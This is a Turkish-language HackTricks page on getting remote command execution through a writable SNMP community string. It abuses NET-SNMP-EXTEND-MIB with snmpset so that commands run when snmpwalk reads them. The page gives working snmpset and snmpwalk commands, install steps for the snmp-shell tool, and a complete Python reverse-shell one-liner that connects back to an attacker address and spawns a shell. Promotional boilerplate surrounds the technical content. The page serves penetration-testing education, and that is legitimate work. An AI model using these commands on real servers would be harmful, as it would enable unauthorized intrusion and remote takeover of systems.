<details>

<summary><strong>AWS hackleme becerilerini sıfırdan ileri seviyeye öğrenmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimizden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

# SNMP Uzaktan Komut Yürütme (RCE)

SNMP, yöneticinin cihaz veya sunucudaki varsayılan yapılandırmasını göz ardı ederse saldırgan tarafından istismar edilebilir. Bir Linux işletim sisteminde **SNMP topluluğunu (rwcommunity) kötüye kullanarak** saldırgan sunucuda komutları yürütebilir.

## Ek Komutlarla Hizmetleri Genişletme

SNMP hizmetlerini genişletmek ve ekstra komutlar eklemek için, "nsExtendObjects" tablosuna yeni **satırlar eklemek mümkündür**. Bunun için `snmpset` komutunu kullanarak gerekli parametreleri sağlamak gerekmektedir. Bu parametreler arasında yürütülecek dosyanın mutlak yolunu ve yürütülecek komutu belirtmek bulunur:
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
'nsExtendStatus."evilcommand"' = createAndGo \
'nsExtendCommand."evilcommand"' = /bin/echo \
'nsExtendArgs."evilcommand"' = 'hello world'
```
## Komut Enjeksiyonu için Komutlar Eklemek

SNMP hizmetinde çalıştırılmak üzere komut enjekte etmek, çağrılan ikili/dosyanın varlığını ve çalıştırılabilir olmasını gerektirir. **`NET-SNMP-EXTEND-MIB`** çağrılan ikili/dosyanın mutlak yolunu sağlamayı zorunlu kılar.

Enjekte edilen komutun çalıştırıldığını doğrulamak için `snmpwalk` komutu kullanılabilir. **Çıktı, komutu ve ilişkili ayrıntıları** (mutlak yol dahil) içerecektir:
```bash
snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
```
## Enjekte Edilen Komutları Çalıştırma

**Enjekte edilen komut okunduğunda çalıştırılır**. Bu davranış **`run-on-read()`** olarak bilinir. Komutun çalıştırılması, snmpwalk okunurken gözlemlenebilir.

### SNMP ile Sunucu Kabuğu Elde Etme

Sunucu üzerinde kontrol sağlamak ve bir sunucu kabuğu elde etmek için, mxrch tarafından geliştirilen bir Python betiği kullanılabilir. [**https://github.com/mxrch/snmp-shell.git**](https://github.com/mxrch/snmp-shell.git) adresinden bu betikten yararlanabilirsiniz.

Alternatif olarak, SNMP'ye belirli bir komut enjekte ederek ters kabuk oluşturulabilir. Bu komut, snmpwalk tarafından tetiklenir ve saldırganın makinesine ters kabuk bağlantısı kurarak kurban makine üzerinde kontrol sağlar.
Bu işlemi çalıştırmak için önceden gereksinimleri yükleyebilirsiniz:
```bash
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```
Ya da ters kabuk:
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```
## Referanslar
* [https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/](https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/)


<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.

</details>
